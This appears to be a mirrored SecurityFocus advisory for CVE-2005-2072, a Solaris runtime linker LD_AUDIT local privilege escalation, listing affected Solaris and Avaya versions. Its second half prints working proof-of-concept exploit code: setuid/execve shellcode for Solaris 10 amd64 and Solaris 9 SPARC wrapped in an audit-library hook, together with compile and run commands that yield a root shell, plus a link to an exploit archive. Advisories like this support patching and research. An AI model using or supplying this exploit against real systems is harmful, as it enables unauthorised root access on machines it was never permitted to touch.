#SpeeDr00t@Black Falcon<br>#bid14074<p><b><span style="font-size: 18pt;">Sun Solaris Runtime Linker LD_AUDIT Privilege Escalation Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/14074/info">info</a><br><a href="http://www.securityfocus.com/bid/14074/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/14074/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/14074/solution">solution</a><br><a href="http://www.securityfocus.com/bid/14074/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
<table border="0" cellpadding="4" cellspacing="0">
<tr>
<td>
<span class="label">Bugtraq ID:</span>
</td>
<td>
				14074
			</td>
</tr>
<tr>
<td>
<span class="label">Class:</span>
</td>
<td>
				Design Error
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">CVE:</span>
</td>
<td>
				
					CVE-2005-2072<br/>
</td>
</tr>
<tr>
<td>
<span class="label">Remote:</span>
</td>
<td>
				No
			</td>
</tr>
<tr>
<td>
<span class="label">Local:</span>
</td>
<td>
				Yes
			</td>
</tr>
<tr>
<td>
<span class="label">Published:</span>
</td>
<td>
				Jun 28 2005 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Updated:</span>
</td>
<td>
				Nov 15 2007 12:38AM
			</td>
</tr>
<tr>
<td>
<span class="label">Credit:</span>
</td>
<td>
				Przemyslaw Frasunek &lt;venglin@freebsd.lublin.pl&gt; is credited with the discovery of this vulnerability.
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">Vulnerable:</span>
</td>
<td>
				
					Sun Solaris  9_x86<br/>
					
				
					Sun Solaris  9<br/>
					
				
					Sun Solaris  8_x86<br/>
					
				
					Sun Solaris  8_sparc<br/>
					
				
					Sun Solaris  10.0_x86<br/>
					
				
					Sun Solaris  10<br/>
					
				
					SchilliX SchilliX 0.1 <br/>
					
				
					Avaya Interactive Response 1.3 <br/>
					
				
					Avaya Interactive Response 1.2.1 <br/>
					
				
					Avaya Interactive Response  <br/>
					
				
					Avaya CMS Server 13.0 <br/>
					
				
					Avaya CMS Server 12.0 <br/>
					
				
					Avaya CMS Server 11.0 <br/>
					
				
					Avaya CMS Server 9.0 <br/>
					
				
					Avaya CMS Server 8.0 <br/>
</td>
</tr>
<tr>
<td colspan="2">
<div class="breakline"></div>
</td>
</tr>
<tr valign="top">
<td>
<span class="label">Not Vulnerable:</span>
</td>
<td>
</td>
</tr>
</table>
</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x15000/14074/Schily-Root.tar">#exploit_Schily-Root.tar</a><br><br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
	An exploit is not required, but proof-of-concept demonstration code was provided. <br/> <br/>For Solaris 10 on amd64: <br/>static char sh = <br/>"\x31\xc0\xeb\x09\x5a\x89\x42\x01\x88\x42\x06\xeb\x0d\xe8\xf2\xff\xff\xff\x9a\x01\x01\x01\x01\x07\x01\xc3\x50\xb0\x17\xe8\xf0\xff\xff\xff\x31\xc0\x68\x2f\x73\x68\x5f\x68\x2f\x62\x69\x6e\x88\x44\x24\x07\x89\xe3\x50\x53\x8d\x0c\x24\x8d\x54\x24\x04\x52\x51\x53\xb0\x0b\xe8\xcb\xff\xff\xff"; <br/> <br/>int la_version() { <br/>        void (*f)(); <br/>        f = (void*)sh; <br/>        f(); <br/>        return 3; <br/>} <br/> <br/>For Solaris 9 SPARC: <br/>char sh = <br/>/* setuid() */ <br/>"\x90\x08\x3f\xff\x82\x10\x20\x17\x91\xd0\x20\x08" <br/>/* execve() */ <br/>"\x20\xbf\xff\xff\x20\xbf\xff\xff\x7f\xff\xff\xff\x90\x03\xe0\x20" <br/>"\x92\x02\x20\x10\xc0\x22\x20\x08\xd0\x22\x20\x10\xc0\x22\x20\x14" <br/>"\x82\x10\x20\x0b\x91\xd0\x20\x08/bin/ksh"; <br/> <br/>int la_version() { <br/>        void (*f)(); <br/>        f = (void*)sh; <br/>        f(); <br/>        return 3; <br/>} <br/> <br/>To compile: <br/>gcc -fPIC -shared -o /tmp/dupa.so dupa.c <br/> <br/>And to exploit: <br/>export LD_AUDIT=/tmp/dupa.so <br/>su <br/> <br/>UPDATE: Core Security Technologies has developed a working commercial exploit for its CORE IMPACT product. This exploit is not otherwise publicly available or known to be circulating in the wild.<br/><br/>The following proof of concept (Schily-Root.tar) has been provided by KF (lists) (kf_lists@digitalmunition.com) for SchilliX:
	
		<ul>
<li><a href="/data/vulnerabilities/exploits/Schily-Root.tar">/data/vulnerabilities/exploits/Schily-Root.tar</a></li>
</ul>
</div>